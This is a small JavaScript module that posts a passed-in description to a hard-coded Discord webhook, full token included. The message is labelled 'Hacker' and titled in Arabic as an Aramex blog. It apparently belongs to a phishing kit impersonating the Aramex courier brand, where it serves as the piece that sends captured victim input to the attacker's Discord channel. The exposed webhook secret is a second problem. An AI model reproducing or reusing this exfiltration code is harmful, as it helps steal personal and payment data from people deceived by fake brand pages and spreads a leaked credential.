import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322987093508624456/66x4qec1yAieRBKh9HzSTIXHY2lA_PGigFbci_5dy9zKbRBIXQlPfxy38AutQqF4B0sP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
